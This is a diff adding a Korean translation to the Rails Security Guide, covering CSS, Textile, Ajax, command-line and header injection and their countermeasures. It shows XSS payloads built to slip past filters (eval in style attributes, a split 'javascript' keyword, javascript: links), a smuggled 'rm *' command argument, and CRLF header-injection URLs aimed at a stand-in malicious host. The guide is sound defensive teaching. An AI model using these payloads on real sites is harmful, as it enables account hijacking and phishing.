+이와 같은 CSS 주입은 style 속성에서 이루어집니다. 그러나 CSS 주입내에는 이미 단일 인용부호와 이중 인용부가 이미 사용되었었기 때문에 단일 인용부호가 허용되지 않습니다. 그러나 자바스크립트는 손쉽게 사용할 수 있는 eval() 함수가 있어서 문자열을 코드로 실행할 수 있습니다. [[[So the payload is in the style attribute. But there are no quotes allowed in the payload, because single and double quotes have already been used. But JavaScript has a handy eval() function which executes any string as code.]]]
 
 ```html
 <div id="mycode" expr="alert('hah!')" style="background:url('javascript:eval(document.all.mycode.expr)')">
 ```
 
-The eval() function is a nightmare for blacklist input filters, as it allows the style attribute to hide the word "innerHTML":
+eval() 함수는 style 속성을 허용하여 "innerHTML" 단어를 감추어 주기 때문에, 블랙리스트 입력 필터 입장에서는 악몽 같은 것입니다. [[[The eval() function is a nightmare for blacklist input filters, as it allows the style attribute to hide the word "innerHTML":]]]
 
 ```
 alert(eval('document.body.inne' + 'rHTML'));
 ```
 
-The next problem was MySpace filtering the word "javascript", so the author used "java&lt;NEWLINE&gt;script" to get around this:
+다음 문제는 MySpace가 "javascript" 단어를 필터링하는 것이었는데, 웜 작성자는 이를 회피하기 위해서 "java&lt;NEWLINE&gt;script" 같이 사용하였습니다. [[[The next problem was MySpace filtering the word "javascript", so the author used "java&lt;NEWLINE&gt;script" to get around this:]]]
 
 ```html
 <div id="mycode" expr="alert('hah!')" style="background:url('java↵ script:eval(document.all.mycode.expr)')">
 ```
 
-Another problem for the worm's author were CSRF security tokens. Without them he couldn't send a friend request over POST. He got around it by sending a GET to the page right before adding a user and parsing the result for the CSRF token.
+웜 작성자에게 있어서 또 다른 문제는 CSRF 보안 토큰이었습니다. 이 토큰이 없었다면 POST를 통해서 친구요청을 보낼 수 없었을 것입니다. 이 보안 토큰을 얻기 위해서 웜 작성자는 사용자를 추가하기 직전에 해당 페이지에 GET 요청을 보내어 그 결과에서 CSRF 토큰을 파싱해서 알아내는 방식으로 해결했습니다. [[[Another problem for the worm's author were CSRF security tokens. Without them he couldn't send a friend request over POST. He got around it by sending a GET to the page right before adding a user and parsing the result for the CSRF token.]]]
 
-In the end, he got a 4 KB worm, which he injected into his profile page.
+결국, 웜 작성자는 4KB 크기의 웜을 만들었고 이것을 자신의 프로파일 페이지로 주입했던 것입니다. [[[In the end, he got a 4 KB worm, which he injected into his profile page.]]]
 
-The [moz-binding](http://www.securiteam.com/securitynews/5LP051FHPE.html) CSS property proved to be another way to introduce JavaScript in CSS in Gecko-based browsers (Firefox, for example).
+[moz-binding](http://www.securiteam.com/securitynews/5LP051FHPE.html) CSS 속성은, 파이어폭스와 같은 Gecko 기반의 브라우저에서 CSS에 자바스크립트를 삽입하는 또 다른 방법으로 밝혀졌습니다. [[[The [moz-binding](http://www.securiteam.com/securitynews/5LP051FHPE.html) CSS property proved to be another way to introduce JavaScript in CSS in Gecko-based browsers (Firefox, for example).]]]
 
-#### Countermeasures
+#### [Countermeasures] 해결책
 
-This example, again, showed that a blacklist filter is never complete. However, as custom CSS in web applications is a quite rare feature, I am not aware of a whitelist CSS filter. _If you want to allow custom colors or images, you can allow the user to choose them and build the CSS in the web application_. Use Rails' `sanitize()` method as a model for a whitelist CSS filter, if you really need one.
+이 예는 블랙리스트 필터가 결코 완전하지 않다는 것을 다시 한번 보여 준 것입니다. 그러나, 웹어플리케이션에서 커스텀 CSS를 사용하는 것이 매우 드물 경우이기 때문에 필자는 화이트리스트 CSS 필터를 알지 못합니다. _커스텀 색상이나 이미지를 허용하는 경우에, 사용자는 색상이나 이미지를 선택하여 웹어플리케이션에서 CSS를 작성할 수 있게 되는 것입니다._ 이와 같이 커스텀 CSS를 허용해야 할 상황이라면, 화이트리스트 CSS 필터를 위해서 레일스의 `sanitize()` 메소드를 사용하기 바랍니다. [[[This example, again, showed that a blacklist filter is never complete. However, as custom CSS in web applications is a quite rare feature, I am not aware of a whitelist CSS filter. _If you want to allow custom colors or images, you can allow the user to choose them and build the CSS in the web application_. Use Rails' `sanitize()` method as a model for a whitelist CSS filter, if you really need one.]]]
 
-### Textile Injection
+### [Textile Injection] Textile 주입
 
-If you want to provide text formatting other than HTML (due to security), use a mark-up language which is converted to HTML on the server-side. [RedCloth](http://redcloth.org/) is such a language for Ruby, but without precautions, it is also vulnerable to XSS.
+보안상의 이유로 HTML 대신에 텍스트 포맷기능을 제공하고자 한다면, 서버사이트에서 HTML로 변환되는 마크업 언어를 사용하기 바랍니다. [RedCloth](http://redcloth.org/)는 그런 용도의 루비용 언어이지만, 유의해서 사용하지 않으면, 오히려 XSS에 취약해 질 수 있습니다. [[[If you want to provide text formatting other than HTML (due to security), use a mark-up language which is converted to HTML on the server-side. [RedCloth](http://redcloth.org/) is such a language for Ruby, but without precautions, it is also vulnerable to XSS.]]]
 
-For example, RedCloth translates `_test_` to &lt;em&gt;test&lt;em&gt;, which makes the text italic. However, up to the current version 3.0.4, it is still vulnerable to XSS. Get the [all-new version 4](http://www.redcloth.org) that removed serious bugs. However, even that version has [some security bugs](http://www.rorsecurity.info/journal/2008/10/13/new-redcloth-security.html), so the countermeasures still apply. Here is an example for version 3.0.4:
+예를 드렁, RedCloth는 `_test_` 를 &lt;em&gt;test&lt;em&gt; 로 번역하여 텍스트를 이택릭체로 만들어 줍니다. 그러나, 최근의 3.0.4 버전까지는 여전히 XSS에 취약하다는 것입니다. [완전히 새로운 version 4](http://www.redcloth.org)를 사용하면 이러한 심각한 버그를 피할 수 있습니다. 그러나, 이 버전 조차도 [몇가지 보안 버그](http://www.rorsecurity.info/journal/2008/10/13/new-redcloth-security.html)를 가지고 있어서 이에 대한 대책을 적용해야 합니다. 아래에 3.0.4 번에 대한 예제 코드가 있습니다. [[[For example, RedCloth translates `_test_` to &lt;em&gt;test&lt;em&gt;, which makes the text italic. However, up to the current version 3.0.4, it is still vulnerable to XSS. Get the [all-new version 4](http://www.redcloth.org) that removed serious bugs. However, even that version has [some security bugs](http://www.rorsecurity.info/journal/2008/10/13/new-redcloth-security.html), so the countermeasures still apply. Here is an example for version 3.0.4:]]]
 
 ```ruby
 RedCloth.new('<script>alert(1)</script>').to_html
 # => "<script>alert(1)</script>"
 ```
 
-Use the :filter_html option to remove HTML which was not created by the Textile processor.
+이런 경우 :filter_html 옵션을 사용하면 Textile 프로세서가 만들지 않는 HTML을 제거할 수 있게 됩니다. [[[Use the :filter_html option to remove HTML which was not created by the Textile processor.]]]
 
 ```ruby
 RedCloth.new('<script>alert(1)</script>', [:filter_html]).to_html
 # => "alert(1)"
 ```
 
-However, this does not filter all HTML, a few tags will be left (by design), for example &lt;a&gt;:
+그러나, 이것도 모든 HTML을 필터하지 못해서 디자인시에 몇가지 태그가 남게 됩니다. 예를 들면, &lt;a&gt; [[[However, this does not filter all HTML, a few tags will be left (by design), for example &lt;a&gt;:]]]
 
 ```ruby
 RedCloth.new("<a href='javascript:alert(1)'>hello</a>", [:filter_html]).to_html
 # => "<p><a href="javascript:alert(1)">hello</a></p>"
 ```
 
-#### Countermeasures
+#### [Countermeasures] 해결책
 
-It is recommended to _use RedCloth in combination with a whitelist input filter_, as described in the countermeasures against XSS section.
+XSS 섹션의 해결책에 기술한 바와 같이, _화이트리스트 입력 필터와 함께 RedCloth를 사용할 것_ 을 권합니다. [[[It is recommended to _use RedCloth in combination with a whitelist input filter_, as described in the countermeasures against XSS section.]]]
 
-### Ajax Injection
+### [Ajax Injection] Ajax 주입
 
-NOTE: _The same security precautions have to be taken for Ajax actions as for "normal" ones. There is at least one exception, however: The output has to be escaped in the controller already, if the action doesn't render a view._
+NOTE: _"정상" 액션에서와 같이 Ajax 액션에 대해서도 동일한 보안 조치를 취해야 합니다. 그러나, 적어도 하나의 예외가 있는데, 액션이 뷰를 렌더링하지 않을 경우, 결과물이 컨트롤러에서 이미 이스케이핑되어야 한다는 것입니다._ [[[_The same security precautions have to be taken for Ajax actions as for "normal" ones. There is at least one exception, however: The output has to be escaped in the controller already, if the action doesn't render a view._]]]
 
-If you use the [in_place_editor plugin](http://dev.rubyonrails.org/browser/plugins/in_place_editing), or actions that return a string, rather than rendering a view, _you have to escape the return value in the action_. Otherwise, if the return value contains a XSS string, the malicious code will be executed upon return to the browser. Escape any input value using the h() method.
+[in_place_editor plugin](http://dev.rubyonrails.org/browser/plugins/in_place_editing)을 사용하거나 뷰를 렌더링하는 대신에 문자열을 반환하는 액션을 사용할 때는, _액션에서 반환되는 값을 이스케이핑해야 합니다._ 그렇지 않을 경우, 반환값이 XSS 문자열을 포함하게 되면, 브라우저로 반환될 경우 악성코드가 실행될 것입니다. h() 메소드를 이용하면 모든 입력 값을 이스케이핑할 수 있습니다. [[[If you use the [in_place_editor plugin](http://dev.rubyonrails.org/browser/plugins/in_place_editing), or actions that return a string, rather than rendering a view, _you have to escape the return value in the action_. Otherwise, if the return value contains a XSS string, the malicious code will be executed upon return to the browser. Escape any input value using the h() method.]]]
 
-### Command Line Injection
+### [Command Line Injection] 커맨드라인 주입
 
-NOTE: _Use user-supplied command line parameters with caution._
+NOTE: _사용자가 지정할 수 있는 커맨드라인 파라미터를 사용할 때는 주의해야 합니다._ [[[_Use user-supplied command line parameters with caution._]]]
 
-If your application has to execute commands in the underlying operating system, there are several methods in Ruby: exec(command), syscall(command), system(command) and `command`. You will have to be especially careful with these functions if the user may enter the whole command, or a part of it. This is because in most shells, you can execute another command at the end of the first one, concatenating them with a semicolon (;) or a vertical bar (|).
+어플리케이션이 서버 운영시스템에서 명령을 실행해야 할 경우, 루비에서는 exec(command), syscall(command), system(command), `command` 와 같은 몇가지 메소드를 제공해 줍니다. 사용자가 전체 명령어나 일부를 입력할 수 있도록 허용될 경우 이러한 함수들을 사용할 때 특별히 주의를 해야 할 것입니다. 왜냐하면, 대부분의 쉘에서는, 첫번째 명령 끝에 세미콜론(;)이나 수직바(|) 문자를 이용하여 또 다른 명령을 실행할 수 있기 때문입니다. [[[If your application has to execute commands in the underlying operating system, there are several methods in Ruby: exec(command), syscall(command), system(command) and `command`. You will have to be especially careful with these functions if the user may enter the whole command, or a part of it. This is because in most shells, you can execute another command at the end of the first one, concatenating them with a semicolon (;) or a vertical bar (|).]]]
 
-A countermeasure is to _use the `system(command, parameters)` method which passes command line parameters safely_.
+_대안으로는 `system(command, parameters)` 메소드를 사용해서 커맨트라인 파라미터를 안정하게 넘겨 주는 것_ 입니다. [[[A countermeasure is to _use the `system(command, parameters)` method which passes command line parameters safely_.]]]
 
 ```ruby
 system("/bin/echo","hello; rm *")
@@ -886,32 +887,32 @@ system("/bin/echo","hello; rm *")
 ```
 
 
-### Header Injection
+### [Header Injection] 헤더 주입
 
-WARNING: _HTTP headers are dynamically generated and under certain circumstances user input may be injected. This can lead to false redirection, XSS or HTTP response splitting._
+WARNING: _HTTP 헤더는 동적으로 생성되기 때문에 어떤 경우에는 사용자의 입력내용이 주입될 수 있습니다. 이것은 잘못된 리디렉션, XSS 또는 HTTP 응답 파싱으로 이어질 수 있습니다._ [[[_HTTP headers are dynamically generated and under certain circumstances user input may be injected. This can lead to false redirection, XSS or HTTP response splitting._]]]
 
-HTTP request headers have a Referer, User-Agent (client software), and Cookie field, among others. Response headers for example have a status code, Cookie and Location (redirection target URL) field. All of them are user-supplied and may be manipulated with more or less effort. _Remember to escape these header fields, too._ For example when you display the user agent in an administration area.
+HTTP 요청 헤더는 여러가지를 포함하지만 특히, Referer, User-Agent (client software), Cookie field 항목을 포함합니다. 예를 들어 응답 헤더는 상태코드, 쿠키, 위치(리디렉션 URL) 항목을 가집니다. 이 모든 것은 사용자가 제공해 주는 것이라서 약간의 노력만 기울이면 얼마든지 조작할 수 있습니다. _이러한 헤더 항목들도 역시 이스케이핑을 해 주어야 함을 기억해야 합니다._ 예를 들면 관리자 페이지에 user agent를 표시할 때 입니다. [[[HTTP request headers have a Referer, User-Agent (client software), and Cookie field, among others. Response headers for example have a status code, Cookie and Location (redirection target URL) field. All of them are user-supplied and may be manipulated with more or less effort. _Remember to escape these header fields, too._ For example when you display the user agent in an administration area.]]]
 
-Besides that, it is _important to know what you are doing when building response headers partly based on user input._ For example you want to redirect the user back to a specific page. To do that you introduced a "referer" field in a form to redirect to the given address:
+이외에도, _응답 헤더의 일부를 사용자 입력내용을 근거로 작성할 때는 어떤 작업을 하고 있는지를 아는 것이 중요합니다._ 예를 들어, 사용자가 특정 페이지로 되돌아 가도록 할 때 입니다. 이를 위해서, 주어진 주소로 정확하게 리디렉트하기 위해서 폼 내에 "referer" 필드를 두는 것입니다. [[[Besides that, it is _important to know what you are doing when building response headers partly based on user input._ For example you want to redirect the user back to a specific page. To do that you introduced a "referer" field in a form to redirect to the given address:]]]
 
 ```ruby
 redirect_to params[:referer]
 ```
 
-What happens is that Rails puts the string into the Location header field and sends a 302 (redirect) status to the browser. The first thing a malicious user would do, is this:
+이와 같이 하면, 레일스가 해당 문자열을 위치 헤더 항목으로 삽입하여 브라우저로 302(리디렉트) 상태코드를 보내게 됩니다. 이 때 악성 사용자가 행하는 최초의 작업은 이와 같습니다. [[[What happens is that Rails puts the string into the Location header field and sends a 302 (redirect) status to the browser. The first thing a malicious user would do, is this:]]]
 
 ```
 http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld
 ```
 
-And due to a bug in (Ruby and) Rails up to version 2.1.2 (excluding it), a hacker may inject arbitrary header fields; for example like this:
+루비와 루비온레일스 2.1.2 버전까지(2.1.2버전은 제외)는 내부 버그로 인해 해커가 아래의 예와 같은 임의의 헤더 필드를 주입할 수 있습니다. [[[And due to a bug in (Ruby and) Rails up to version 2.1.2 (excluding it), a hacker may inject arbitrary header fields; for example like this:]]]
 
 ```
 http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld%0d%0aX-Header:+Hi!
 http://www.yourapplication.com/controller/action?referer=path/at/your/app%0d%0aLocation:+http://www.malicious.tld
 ```
 
-Note that "%0d%0a" is URL-encoded for "\r\n" which is a carriage-return and line-feed (CRLF) in Ruby. So the resulting HTTP header for the second example will be the following because the second Location header field overwrites the first.
+"%0d%0a"는 루비에서 개행(CRLF)을 의미하는 "\r\n"에 대한 URL 인코딩 문자라는 것을 주목해야 합니다. 따라서 두번째 예의 결과로 만들어지는 HTTP 헤더는, 두번째 위치 헤더 항목이 첫번째 것을 덮어 쓰기 때문에 아래와 같은 것입니다. [[[Note that "%0d%0a" is URL-encoded for "\r\n" which is a carriage-return and line-feed (CRLF) in Ruby. So the resulting HTTP header for the second example will be the following because the second Location header field overwrites the first.]]]
 
 ```
 HTTP/1.1 302 Moved Temporarily
@@ -919,7 +920,7 @@ HTTP/1.1 302 Moved Temporarily
 Location: http://www.malicious.tld
 ```
 
-So _attack vectors for Header Injection are based on the injection of CRLF characters in a header field._ And what could an attacker do with a false redirection? He could redirect to a phishing site that looks the same as yours, but asks to login again (and sends the login credentials to the attacker). Or he could install malicious software through browser security holes on that site. Rails 2.1.2 escapes these characters for the Location field in the `redirect_to` method. _Make sure you do it yourself when you build other header fields with user input._
+따라서, _헤더 주입에 대한 공격 매개체는 CRLF 문자를 헤더 필드에 주입하는 것에 근거하게 됩니다._ 그렇다면 잘못된 URL로 리디렉션하므로써 공격자는 어떤 일을 할 수 있을까요? 공격자는 원래 웹사이트와 똑같이 생긴 피싱 사이트로 리디렉트하도록 하여 로그인하도록 요구하게 되고 결과적으로 로그인 정보를 공격자에게 보내게 되는 것입니다. 또는 공격자는 해당 사이트에 브라우저 보안 구멍을 통해서 악성 소프트웨어를 인스톨할 수 있게 될 것입니다. 레일스 2.1.2는 `redirect_to` 메소드에서 헤더의 위치 필드에 대해서 이러한 문자들을 이스케이핑하도록 지원합니다. _사용자의 입력내용을 이용하여 다른 헤더 필드를 작성할 때는 직접 코디을 하도록 해야 합니다._ [[[So _attack vectors for Header Injection are based on the injection of CRLF characters in a header field._ And what could an attacker do with a false redirection? He could redirect to a phishing site that looks the same as yours, but asks to login again (and sends the login credentials to the attacker). Or he could install malicious software through browser security holes on that site. Rails 2.1.2 escapes these characters for the Location field in the `redirect_to` method. _Make sure you do it yourself when you build other header fields with user input._]]]
 
 #### Response Splitting
 
